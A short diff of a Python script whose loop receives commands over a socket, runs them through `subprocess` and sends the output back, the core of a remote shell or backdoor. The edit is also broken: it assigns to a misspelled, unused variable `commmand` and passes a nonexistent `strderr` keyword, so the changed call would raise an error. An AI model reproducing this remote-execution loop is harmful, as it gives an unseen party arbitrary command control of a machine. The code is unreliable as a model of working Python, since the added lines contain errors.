@@ -22,9 +22,10 @@ def main():
         # data = raw_input("input a command: ")
         
         command = client.recv(BUFFER).decode("UTF-8")
+        commmand = command.split(" ")
          # EXDCUTING COMMAND
         # getoutput returns output stdout and stderr of executing cmd in a shell
-        output = subprocess.getoutput(command)
+        output = subprocess.check_output(command, strderr=subprocess.STDOUT)
         client.send(output.encode())
         
     client.close()
